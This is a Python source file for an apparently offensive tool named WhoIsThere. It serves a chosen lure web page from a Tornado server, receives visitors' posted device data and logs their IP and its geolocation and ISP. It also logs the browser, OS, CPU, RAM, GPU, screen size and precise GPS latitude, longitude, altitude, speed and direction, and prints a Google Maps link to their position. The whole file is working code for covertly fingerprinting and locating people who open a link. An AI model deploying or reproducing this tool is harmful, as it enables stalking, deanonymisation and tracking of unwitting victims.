import os
import json
import socket
import tornado.ioloop
import tornado.web
import tornado
import settings as optns
import argparse
import requests
from packaging import version

selfVersion = "0.0.3"
script_path = os.path.dirname(os.path.realpath(__file__))

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port. Default: 8080')
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')

args = parser.parse_args()
port = args.port
chk_upd = args.update
print_v = args.version

header = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"
global directory
global page
global name
directory = ""
page = ""
name = ""
def parse_ip(data):
	request = requests.get(f'https://ipwhois.app/json/{data}')
	status_code = request.status_code

	if status_code == 200:
		ip = json.loads(request.text)
		continent = str(ip['continent'])
		country = str(ip['country'])
		region = str(ip['region'])
		city = str(ip['city'])
		org = str(ip['org'])
		isp = str(ip['isp'])
		print(f'''
{Y}[<<] {C}Continent: {W}{continent}

{Y}[<<] {C}Country: {W}{country}

{Y}[<<] {C}Region: {W}{region}

{Y}[<<] {C}City: {W}{city}

{Y}[<<] {C}Org: {W}{org}

{Y}[<<] {C}ISP: {W}{isp}''')

def parse_data(data):
	lat = None
	lon = None
	print(f"\n{Y}[LOG] {W}Received data:")
	parsed = json.loads(data)
	for i in parsed:
		if i == "Ip":
			print(f"{Y}\n[<<] {C}IP: {W}{parsed[i]}")
			parse_ip(parsed[i])
		elif i == "Ptf":
			print(f"{Y}\n[<<] {C}Platform: {W}{parsed[i]}")
		elif i == "Brw":
			print(f"{Y}\n[<<] {C}Browser: {W}{parsed[i]}")
		elif i == "Cc":
			print(f"{Y}\n[<<] {C}Number of CPU: {W}{parsed[i]}")
		elif i == "Ram":
			print(f"{Y}\n[<<] {C}Gb of RAM: {W}{parsed[i]}")
		elif i == "Ven":
			print(f"{Y}\n[<<] {C}GPU WebGL vendor: {W}{parsed[i]}")
		elif i == "Ren":
			print(f"{Y}\n[<<] {C}GPU WebGL renderer: {W}{parsed[i]}")
		elif i == "Ht":
			print(f"{Y}\n[<<] {C}Screen height: {W}{parsed[i]}")
		elif i == "Wd":
			print(f"{Y}\n[<<] {C}Screen width: {W}{parsed[i]}")
		elif i == "Os":
			print(f"{Y}\n[<<] {C}OS: {W}{parsed[i]}")
		elif i == "Status":
			print(f"{Y}\n[<<] {C}Location status: {W}{parsed[i]}")
		elif i == "Lat":
			print(f"{Y}\n[<<] {C}Latitude: {W}{parsed[i]}")
			lat = parsed[i]
		elif i == "Lon":
			print(f"{Y}\n[<<] {C}Longitude: {W}{parsed[i]}")
			lon = parsed[i]
			print(f'{Y}\n[<<] {C}Google Maps: {W}https://www.google.com/maps/place/{lat.strip(" deg")}+{lon.strip(" deg")}')
		elif i == "Acc":
			print(f"{Y}\n[<<] {C}Accuracy: {W}{parsed[i]}")
		elif i == "Alt":
			print(f"{Y}\n[<<] {C}Altitude: {W}{parsed[i]}")
		elif i == "Dir":
			print(f"{Y}\n[<<] {C}Direction: {W}{parsed[i]}")
		elif i == "Spd":
			print(f"{Y}\n[<<] {C}Speed: {W}{parsed[i]}")


class App(tornado.web.Application):
	def __init__(self):
		handlers = [
			(r"/", MainHandler)
		]
		#self.add_header('ngrok-skip-browser-warning', 'true')
		settings = dict(title=u"Tornado Predictor", static_path=f"{script_path}/pages/static", template_path=os.path.join(os.path.dirname(__file__)), debug=optns.debug)
		super(App,self).__init__(handlers,**settings)

class MainHandler(tornado.web.RequestHandler):
	def get(self):
		self.render(f"{script_path}/pages/{directory}/index.html")
	def post(self):
		data = self.get_argument("userData")
		parse_data(data)

def make_app():
	return App()

def start_server():
	app = make_app()
	if port:
		print(f"{G}Sucess")
		print(f"\n{Y}[LOG] {C}Site avaliable on: {W}http://{optns.host}:{port}/")
		app.listen(port=port,address=optns.host)
	else:
		print(f"{G}Sucess")
		print(f"\n{Y}[LOG] {C}Site avaliable on: {W}http://{optns.host}:{optns.port}/")
		app.listen(port=optns.port,address=optns.host)
	print(f"\n{Y}[LOG] {W}Waiting for client interact... Ctrl+Break for exit.")
	tornado.ioloop.IOLoop.current().start()

def check_for_update():
	print(f"\n{Y}[LOG] {W}Checking for updates...\n")
	metadata = json.loads(requests.get("https://raw.githubusercontent.com/tspstudio/WhoIsThere/main/meta.json").text)
	ver = metadata["version"]
	if version.parse(ver) > version.parse(selfVersion):
		print(f"{Y}[LOG] {W}Update avaliable! Go to https://github.com/tspstudio/WhoisThere and install new update {ver}!\n")
	else:
		print(f"{Y}[LOG] {W}No update required :(\n")
	print(f"{Y}[LOG] {C}Version: {W}{selfVersion}")

def main():
	if print_v:
		print(selfVersion)
		quit()
	if chk_upd:
		check_for_update()
		quit()
	global directory
	global page
	global name
	logo = ''' __          ___             _____       _______ _                    \n \ \        / / |           |_   _|     |__   __| |                   \n  \ \  /\  / /| |__   ___     | |  ___     | |  | |__   ___ _ __ ___  \n   \ \/  \/ / | '_ \ / _ \    | | / __|    | |  | '_ \ / _ \ '__/ _ \ \n    \  /\  /  | | | | (_) |  _| |_\__ \    | |  | | | |  __/ | |  __/ \n     \/  \/   |_| |_|\___/  |_____|___/    |_|  |_| |_|\___|_|  \___| \n                                                                      \n
'''
	os.system("color 2")
	print(f"{G}{logo}{Y}\n")
	check_for_update()
	print(f"\n{Y}[LOG] {W}Choose one template: \n")
	with open(f"{script_path}/pages/pages.json","r") as f:
		data = json.loads(f.read())
		pages = data["pages"]
		pagesCount = len(pages)
		for i in pages:
			print(f"{Y}[<<] [{pages.index(i)}] {C}" + i["name"])
		choice = input(f"\n{Y}[>>] : {C}")
		try:
			choice = int(choice)
		except ValueError:
			print(f"{R}[X] Invalid choice!")
			quit()
		if choice < 0 or choice > pagesCount:
			print(f"{R}[X] Invalid choice!")
			quit()
		f.close()
	page = pages[choice]
	name = page["name"]
	directory = page["dir"]
	print(f"\n{Y}[LOG] {W}Loading {name} page...")
	try:
		f = open(f"{script_path}/pages/{directory}/index.html", "r")
	except FileNotFoundError:
		print(f"\n{R}[X] Main file not found!")
		input()
		quit()
	print(f"{G}\n[V] index.html file found!")
	print(f"\n{Y}[LOG] {W}Starting web server: ", end="")
	start_server()

if __name__ == '__main__':
	main()